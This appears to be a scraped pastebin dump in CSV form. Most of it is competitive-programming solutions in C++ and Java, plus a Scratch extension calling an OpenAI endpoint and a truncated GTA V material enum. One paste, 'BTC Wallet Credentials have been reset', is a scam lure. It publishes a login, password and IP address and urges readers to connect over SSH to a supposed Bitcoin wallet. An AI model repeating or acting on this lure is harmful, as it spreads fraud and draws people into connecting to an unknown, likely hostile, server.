id,title,username,language,date,content
PLkeM9iL,Splitting Bill O(1) per case with Precomputation (C++),Spidey2182,C++,Wednesday 5th of July 2023 01:01:59 AM CDT,"#include <iostream>

using namespace std;

int* sieveOfEratosthenes(int n) {
    int* sieve = new int[n + 5];
    for (int i = 0; i < n + 5; i++)
        sieve[i] = 1;
    sieve[0] = 0;
    for (int i = 2; i * i < n + 5; i++)
        for (int j = i * i; j < n + 5; j += i)
            sieve[j] = i;
    return sieve;
}

int main() {
    int* sieve = sieveOfEratosthenes(1000000);

    int testCases;
    cin >> testCases;
    for (int testCase = 1; testCase <= testCases; testCase++) {
        int n;
        cin >> n;
        cout << n / sieve[n] - sieve[n] << '\n';
    }
	
    return 0;
}
"
Jinkznfa,Splitting Bill O(1) per case with Precomputation (Java),Spidey2182,Java,Wednesday 5th of July 2023 12:59:44 AM CDT,"import java.util.*;

class TestClass {
    static int[] sieveOfEratosthenes(int n) {
        int[] sieve = new int[n + 5];
        Arrays.fill(sieve, 1);
        sieve[0] = 0;
        for (int i = 2; i * i < sieve.length; i++)
            for (int j = i * i; j < sieve.length; j += i)
                sieve[j] = i;
        return sieve;
    }

    public static void main(String args[] ) throws Exception {
        int[] sieve = sieveOfEratosthenes(1000000);

        Scanner sc = new Scanner(System.in);
        
        int testCases = sc.nextInt();
        for (int testCase = 1; testCase <= testCases; testCase++) {
            int n = sc.nextInt();
            System.out.println(n / sieve[n] - sieve[n]);
        }
    }
}
"
b1q0uXdd,BTC Wallet Credentials have been reset,posserestu_37,GetText,Wednesday 5th of July 2023 12:57:20 AM CDT,"Dear User
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please disregard this message.
Your new login credentials are ektodermasv:w45N4k on 45.9.148.244
You can connect via SSH.
Regards"
j49ASXu4,Minimum Maximum Subarray Sum (Java),Spidey2182,Java,Wednesday 5th of July 2023 12:52:47 AM CDT,"import java.util.*;

class TestClass {
    public static void main(String args[] ) throws Exception {
        Scanner sc = new Scanner(System.in);
        int n = sc.nextInt();
        int k = sc.nextInt();
        int[] a = new int[n];
	    for (int i = 0; i < n; i++)
    		a[i] = sc.nextInt();
 
	    long l = 1, r = (long)1e15, m;
	    while (l < r) {
    		m = (l + r) / 2;
 
		    if (numberOfSubarrays(a, m) <= k)
    			r = m;
		    else
    			l = m + 1;
    	}

        System.out.println(r);
    }

    static int numberOfSubarrays(int[] a, long sum) {
	    int ans = 0;
	    long curr = 0;
	    for (int x : a) {
    		if (x > sum)
			    return Integer.MAX_VALUE; // Not possible
		    if (curr + x > sum) {
    			ans++;
			    curr = 0;
		    }
		    curr += x;
	    }
    
	    return ans + 1;
    }
}
"
pAvsFgQJ,SCRATCH ChatGPT,A_GUES,JavaScript,Wednesday 5th of July 2023 12:50:00 AM CDT,"class AIBlock {
    getInfo() {
        return {
            ""id"": ""AI"",
            ""name"": ""AI"",
            ""blocks"": [{
                ""opcode"": ""completePrompt"",
                ""blockType"": ""reporter"",
                ""text"": ""complete prompt [string]"",
                ""arguments"": {
                    ""string"": {
                        ""type"": ""string"",
                        ""defaultValue"": ""Explain quantum computing in simple terms""
                    }
                }
            }],
            ""menus"": {}
        };
    }

    async completePrompt({ string }) {
        const text = string.trim();
        const url = `https://api.openai.com/v1/engines/davinci/completions`;

        const options = {
            method: ""POST"",
            body: JSON.stringify({
                prompt: text,
                max_tokens: 300,
            }),
            headers: {
                Authorization: ""Bearer "" + API_KEY,
                ""Content-type"": ""application/json; charset=UTF-8""
            },
        };

        console.log(""REQUEST:"" + url);

        const response = await fetch(url, options);
        const jsonData = await response.json();
        const output = jsonData.choices[0].text;
        return output;
    }
}

// If you're not building a Scratch extension, you might want to simply create an instance of the class like this:
let aiBlock = new AIBlock();"
S2i6pHFe,XOR - SUM O(1) (C++),Spidey2182,C++,Wednesday 5th of July 2023 12:45:10 AM CDT,"#include <iostream>
using namespace std;
int main() {
	int m, n;
	cin >> m >> n;
	
	// a + b = (a ^ b) + 2 * (a & b)
	if(m >= n && (m - n) % 2 == 0)
        cout << 1;
    else
        cout << 0;
	return 0;
}
"
STQLYYz1,XOR - SUM O(m) (C++),Spidey2182,C++,Wednesday 5th of July 2023 12:43:10 AM CDT,"#include <iostream>
using namespace std;
int main() {
	int m, n;
	cin >> m >> n;
	
	for(int i = 0; i <= m; i++) {
        if((i ^ (m - i)) == n) {
            cout << 1;
            return 0;
        }
    }
 
    cout << 0;
	return 0;
}
"
07vwimP6,XOR - SUM O(1) (Java),Spidey2182,Java,Wednesday 5th of July 2023 12:40:32 AM CDT,"import java.util.*;

class TestClass {
    public static void main(String args[] ) throws Exception {
        Scanner sc = new Scanner(System.in);
        int m = sc.nextInt();
        int n = sc.nextInt();

        // a + b = (a ^ b) + 2 * (a & b)
        if(m >= n && (m - n) % 2 == 0)
            System.out.println(1);
        else
            System.out.println(0);
    }
}
"
EpykV3Uq,XOR - SUM O(m) (Java),Spidey2182,Java,Wednesday 5th of July 2023 12:35:39 AM CDT,"import java.util.*;

class TestClass {
    public static void main(String args[] ) throws Exception {
        Scanner sc = new Scanner(System.in);
        int m = sc.nextInt();
        int n = sc.nextInt();

        for(int i = 0; i <= m; i++) {
            if((i ^ (m - i)) == n) {
                System.out.println(1);
                return;
            }
        }

        System.out.println(0);
    }
}
"
rrrqgQKv,GtaV Surface Materials,Tukas14,C#,Tuesday 4th of July 2023 11:47:09 PM CDT,"public enum Materials : uint
{
    Default = -1775485061, 
    Concrete = 1187676648, 
    ConcretePothole = 359120722, 
    ConcreteDusty = -1084640111, 
    Tarmac = 282940568, 
    TarmacPainted = -1301352528, 
    TarmacPothole = 1886546517, 
    RumbleStrip = -250168275, 
    BreezeBlock = -954112554, 
    Rock = -840216541, 
    RockMossy = -124769592, 
    Stone = 765206029, 
    Cobblestone = 576169331, 
    Brick = 1639053622, 
    Marble = 1945073303, 
    PavingSlab = 1907048430, 
    SandstoneSolid = 592446772, 
    SandstoneBrittle = 1913209870, 
    SandLoose = -1595148316, 
    SandCompact = 510490462, 
    SandWet = 909950165, 
    SandTrack = -1907520769, 
    SandUnderwater = -1136057692, 
    SandDryDeep = 509508168, 
    SandWetDeep = 1288448767, 
    Ice = -786060715, 
    IceTarmac = -1931024423, 
    SnowLoose = -1937569590, 
    SnowCompact = -878560889, 
    SnowDeep = 1619704960, 
    SnowTarmac = 1550304810, 
    GravelSmall = 951832588, 
    GravelLarge = 2128369009, 
    GravelDeep = -356706482, 
    GravelTrainTrack = 1925605558, 
    DirtTrack = -1885547121, 
    MudHard = -1942898710, 
    MudPothole = 312396330, 
    MudSoft = 1635937914, 
    MudUnderwater = -273490167, 
    MudDeep = 1109728704, 
    Marsh = 223086562, 
    MarshDeep = 1584636462, 
    Soil = -700658213, 
    ClayHard = 1144315879, 
    ClaySoft = 560985072, 
    GrassLong = -461750719, 
    Grass = 1333033863, 
    GrassShort = -1286696947, 
